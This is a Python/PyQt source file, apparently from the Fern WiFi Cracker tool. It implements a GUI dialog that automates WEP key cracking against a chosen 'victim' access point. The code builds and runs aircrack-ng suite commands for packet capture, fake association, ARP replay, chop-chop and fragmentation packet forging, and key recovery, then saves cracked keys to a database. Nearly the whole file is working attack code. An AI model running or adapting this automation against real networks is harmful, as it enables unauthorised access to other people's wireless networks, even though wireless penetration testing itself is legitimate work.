from core.fern import *
from core.tools import*
from core.variables import *
from gui.wep_attack import *


from core import variables

#
# Wep Attack window class for decrypting wep keys
#

class wep_attack_dialog(QtGui.QDialog,wep_window):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)

        self.connect(self.label_3,QtCore.SIGNAL("DoubleClicked()"),self.mouseDoubleClickEvent)
        self.connect(self.wep_access_point_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.selected_wep_access)
        self.connect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.wep_launch_attack)
        self.connect(self,QtCore.SIGNAL("injection_working"),self.injection_working)
        self.connect(self,QtCore.SIGNAL("injection_not_working"),self.injection_not_working)
        self.connect(self,QtCore.SIGNAL("associating"),self.associating)
        self.connect(self,QtCore.SIGNAL("update_progress_bar"),self.update_bar)
        self.connect(self,QtCore.SIGNAL("progress maximum"),self.progress_maximum)
        self.connect(self,QtCore.SIGNAL("injecting"),self.injecting)
        self.connect(self,QtCore.SIGNAL("gathering"),self.gathering)
        self.connect(self,QtCore.SIGNAL("chop-chop injecting"),self.chop_chop_attack)
        self.connect(self,QtCore.SIGNAL("fragment injecting"),self.fragmented_attack)
        self.connect(self,QtCore.SIGNAL("key not found yet"),self.key_not_found_yet)
        self.connect(self,QtCore.SIGNAL("wep found"),self.key_found)
        self.connect(self,QtCore.SIGNAL("cracking"),self.cracking)
        self.connect(self,QtCore.SIGNAL('passive mode'),self.passive_mode)
        self.connect(self,QtCore.SIGNAL('association failed'),self.association_failed)

        # wep_details = {'Elite': ['00:C0:CA:8B:15:62', '1', '54', '10']}

        access_point = wep_details.keys()[0]                                                        # The first key in dictionary

        self.essid_label.setText('<font color=red>%s</font>'%(access_point))                        # Access point name
        self.bssid_label.setText('<font color=red>%s</font>'%(wep_details[access_point][0]))        # Mac address
        self.channel_label.setText('<font color=red>%s</font>'%(wep_details[access_point][1]))      # Channel
        self.power_label.setText('<font color=red>%s</font>'%(wep_details[access_point][3]))        # Power
        self.encrypt_wep_label.setText('<font color=red>WEP</font>')

        attack_type = ['Arp Request Replay','Chop-Chop Attack','Fragmentation Attack']

        self.wep_access_point_combo.addItems(sorted(wep_details.keys()))
        self.attack_type_combo.addItems(attack_type)


    def selected_wep_access(self):
        global victim_mac
        global victim_channel
        global victim_access_point
        victim_access_point = str(self.wep_access_point_combo.currentText())

        # wep_details = {'Elite': ['00:C0:CA:8B:15:62', '1', '54', '10']}

        victim_mac = wep_details[victim_access_point][0]
        victim_channel = wep_details[victim_access_point][1]
        victim_power = wep_details[victim_access_point][3]
        victim_speed = wep_details[victim_access_point][2]

        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WEP</font>')


    def mouseDoubleClickEvent(self,event):
        ivs = ivs_dialog()
        ivs.exec_()

    #
    # SIGNALS AND SLOTS FOR THE WEP CRACK STATUS
    #

    def wep_disable_items(self):
        self.cracking_label.setEnabled(False)
        self.wep_status_label.setEnabled(False)
        self.injecting_label.setEnabled(False)
        self.associate_label.setEnabled(False)
        self.injection_work_label.setEnabled(False)
        self.gathering_label.setEnabled(False)
        self.ivs_progress_label.setEnabled(False)
        self.wep_status_label.setEnabled(False)
        self.cracking_label.setText("Cracking Encryption")
        self.wep_status_label.setText("wep encryption status")
        self.injecting_label.setText("Gathering packets")
        self.associate_label.setText("Associating with Access Point")
        self.injection_work_label.setText(" \t Injection capability status ")
        self.ivs_progress_label.setText('captured IVS status')
        self.gathering_label.setText("Packet injection Status")
        self.wep_key_label.setText('')
        self.wep_attack_button.setText("Attack")


    def cancel_wep_attack(self):
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall aircrack-ng')
        commands.getstatusoutput('killall aireplay-ng')
        self.disconnect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wep_attack)
        self.connect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.wep_launch_attack)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_2.png"%(os.getcwd())))
        self.wep_attack_button.setIcon(icon)
        self.wep_attack_button.setText("Attack")




    def injection_working(self):
        self.injection_work_label.setEnabled(True)
        self.injection_work_label.setText('<font color=yellow> Injection is working on %s</font>'%(str(reader('/tmp/fern-log/monitor.log'))))

    def injection_not_working(self):
        self.injection_work_label.setEnabled(True)
        self.injection_work_label.setText('<font color=red> %s is not injecting or proximity is low </font>'%(str(reader('/tmp/fern-log/monitor.log'))))

    def associating(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText('<font color=yellow>Associating with Access Point</font>')

    def association_failed(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText('<font color=yellow>Security countermeasure Activated</font>')


    def progress_maximum(self):
        global ivs_value
        self.ivs_progress.setValue(ivs_value)

    def update_bar(self):
        global ivs_number
        if 'wep_dump-01.csv' in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            update_main = reader('/tmp/fern-log/WEP-DUMP/wep_dump-01.csv')
            update_filter = update_main.replace(',','\n')
            update_filter2 = update_filter.splitlines()
            try:
                update_progress = int(update_filter2[26].strip(' '))
            except IndexError:time.sleep(1)
            try:
                self.ivs_progress.setValue(update_progress)
                ivs_number = update_progress
                self.ivs_progress_label.setEnabled(True)
                self.ivs_progress_label.setText('<font color=yellow>%s ivs</font>'%(str(update_progress)))
            except UnboundLocalError:time.sleep(1)
        else:
            pass

    def gathering(self):
        self.injecting_label.setEnabled(True)
        self.injecting_label.setText('<font color=yellow>Gathering Packets</font>')

    def passive_mode(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Passive Mode Activated</font>')

    def injecting(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Arp Packets</font>')

    def chop_chop_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Chop-Chop Packets</font>')

    def fragmented_attack(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Injecting Fragmented Packets</font>')

    def key_not_found_yet(self):
        self.cracking_label.setEnabled(True)
        self.cracking_label.setText('<font color=yellow>Cracking Encryption</font>')

    def key_found(self):
        self.cracking_label.setEnabled(True)
        self.cracking_label.setText('<font color=yellow>Cracking Encryption</font>')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        self.wep_key_label.setEnabled(True)
        self.wep_key_label.setText('<font color=red>%s</font>'%(WEP))
        self.wep_status_label.setEnabled(True)
        self.wep_status_label.setText('<font color=yellow>Wep Encryption Broken</font>')
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_2.png"%(os.getcwd())))
        self.wep_attack_button.setIcon(icon)
        self.wep_attack_button.setText('Attack')
        self.cancel_wep_attack()
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')


    def cracking(self):
        self.wep_status_label.setEnabled(True)
        self.wep_status_label.setText('<font color=red>Please Wait....</font>')

    #
    # THREADS FOR AUTOMATION
    #
    def injection_status(self):
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        injection_string = ''
        while 'Injection is working' not in injection_string:
            injection_string += str(commands.getstatusoutput('aireplay-ng -9 %s'%(monitor)))
            self.emit(QtCore.SIGNAL("injection_not_working"))

        self.emit(QtCore.SIGNAL("injection_working"))


        ########################################### SPECIAL COMMAND THREADS ######################################
    def dump_thread(self):
        wep_victim_channel = victim_channel
        access_point_mac = victim_mac
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('%s airodump-ng -c %s -w /tmp/fern-log/WEP-DUMP/wep_dump --bssid %s %s'%(variables.xterm_setting,wep_victim_channel,access_point_mac,monitor))

    def association_thread(self):
        global scan_control
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log').strip('\n'))

        self.emit(QtCore.SIGNAL("associating"))
        association_string = ''
        association_timer = 0
        while True:
            association_string += str(commands.getstatusoutput('aireplay-ng -1 0 -a %s -h %s %s'%(victim_mac,attacker_mac_address,monitor)))
            if'Association successful :-)' in association_string:
                thread.start_new_thread(self.successful_accociation_process,())
                break
            if association_timer >= 1:
                thread.start_new_thread(self.unsuccessful_association_process,())
                break
            if scan_control != 0:
                break
            association_timer += 1


    def unsuccessful_association_process(self):
        self.emit(QtCore.SIGNAL('association failed'))
        self.emit(QtCore.SIGNAL("gathering"))
        time.sleep(4)
        thread.start_new_thread(self.update_progress_bar,())
        self.emit(QtCore.SIGNAL('passive mode'))



    def successful_accociation_process(self):
        attack_mode = self.attack_type_combo.currentText()
        thread.start_new_thread(self.update_progress_bar,())
        self.emit(QtCore.SIGNAL("gathering"))
        thread.start_new_thread(self.update_progress_bar,())
        time.sleep(4)
        if attack_mode == 'Arp Request Replay':
            thread.start_new_thread(self.arp_request_thread,())     # arp_request_thread
            self.emit(QtCore.SIGNAL("injecting"))

        elif attack_mode == 'Chop-Chop Attack':                     # Chop-Chop attack thread
            thread.start_new_thread(self.chop_chop_thread,())

        else:
            thread.start_new_thread(self.fragmentation_thread,())   # Fragmentation attack thread


     ##################################### WEP ATTACK MODES ###############################


    def arp_request_thread(self):
        access_point_mac = victim_mac
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput("cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -3 -e '%s' -b %s %s"%(variables.xterm_setting,victim_access_point,access_point_mac,monitor))

    def chop_chop_thread(self):

        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log').strip('\n'))
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        access_point_mac = victim_mac
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -4 -F -h %s %s'%(variables.xterm_setting,attacker_mac_address,monitor))

        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y \
                                    /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/chop_chop.cap'%(variables.xterm_setting,access_point_mac,attacker_mac_address))

        self.emit(QtCore.SIGNAL("chop-chop injecting"))
        self.emit(QtCore.SIGNAL("chop-chop injecting"))
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/chop_chop.cap %s'%(variables.xterm_setting,monitor))

    def fragmentation_thread(self):
        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log').strip('\n'))
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        access_point_mac = victim_mac

        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -5 -F -b %s -h %s %s'%(variables.xterm_setting,access_point_mac,attacker_mac_address,monitor))
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/fragmented.cap'%(variables.xterm_setting,access_point_mac,attacker_mac_address))
        self.emit(QtCore.SIGNAL("fragment injecting"))
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/fragmented.cap %s'%(variables.xterm_setting,monitor))



    ################################################# WEP KEY CRACK ########################################################


    def crack_wep(self):
        directory = '/tmp/fern-log/WEP-DUMP/'
        commands.getstatusoutput('killall aircrack-ng')
        process = subprocess.Popen('aircrack-ng '+ directory + '*.cap -l '+ directory + 'wep_key.txt',shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
        status = process.stdout
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            if 'Failed. Next try with' in status.readline():
                thread.start_new_thread(self.crack_wep,())
                break
            time.sleep(40)



    def update_progress_bar(self):
        global ivs_number
        global digit
        global ivs_value

        if 'ivs_settings.log' in os.listdir('/tmp/fern-log'):
            ivs_value = int(reader('/tmp/fern-log/ivs_settings.log'))
            maximum = self.ivs_progress.setMaximum(ivs_value)
            maximum = self.ivs_progress.setRange(0,ivs_value)
        else:
            ivs_value = 10000
            maximum = self.ivs_progress.setMaximum(10000)
            maximum = self.ivs_progress.setRange(0,10000)


        while ivs_number <= ivs_value:
            time.sleep(0.4)
            self.emit(QtCore.SIGNAL("update_progress_bar"))

        self.emit(QtCore.SIGNAL("progress maximum"))
        thread.start_new_thread(self.crack_wep,())                   #Thread for cracking wep

        thread.start_new_thread(self.key_check,())
        self.emit(QtCore.SIGNAL("cracking"))
        time.sleep(13)

        if 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            self.emit(QtCore.SIGNAL("next_try"))
            QtCore.SIGNAL("update_progress_bar")
            thread.start_new_thread(self.next_phase,())


    def updater(self):
        global wep_string
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            self.emit(QtCore.SIGNAL("update_progress_bar"))
            time.sleep(1)


    def next_phase(self):
        thread.start_new_thread(self.updater,())
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            time.sleep(9)
        self.emit(QtCore.SIGNAL("wep found"))


    def key_check(self):
        global WEP
        global victim_mac
        global wep_key_commit
        while 'wep_key.txt' not in os.listdir('/tmp/fern-log/WEP-DUMP/'):
            self.emit(QtCore.SIGNAL("key not found yet"))
            time.sleep(2)

        key = reader('/tmp/fern-log/WEP-DUMP/wep_key.txt')

        WEP = key
        self.emit(QtCore.SIGNAL("wep found"))
        commands.getstatusoutput('killall aircrack-ng')
        commands.getstatusoutput('killall aireplay-ng')
        commands.getstatusoutput('killall airmon-ng')
        commands.getstatusoutput('killall airodump-ng')
        if len(WEP) > 0:
            if wep_key_commit == 0:
                set_key_entries(victim_access_point,victim_mac,'WEP',str(WEP.replace(':','')),victim_channel)      #Add WEP Key to Database Here
                self.emit(QtCore.SIGNAL('update database label'))
                wep_key_commit += 1





        ############################################# END OF THREAD ################################


    def run_wep_attack(self):
        thread.start_new_thread(self.dump_thread,())                  # airodump_thread
        thread.start_new_thread(self.association_thread,())           # association_thread


    def wep_launch_attack(self):
        global ivs_number
        global wep_key_commit
        global WEP

        ivs_number = 0
        WEP = ''
        wep_key_commit = 0
        self.wep_disable_items()
        self.emit(QtCore.SIGNAL("stop scan"))
        self.ivs_progress.setValue(0)
        self.disconnect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.wep_launch_attack)
        self.connect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wep_attack)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
        self.wep_attack_button.setIcon(icon)
        self.wep_attack_button.setText('Stop')
        commands.getstatusoutput('rm -r /tmp/fern-log/WEP-DUMP/*')
        thread.start_new_thread(self.injection_status,())
        thread.start_new_thread(self.run_wep_attack,())




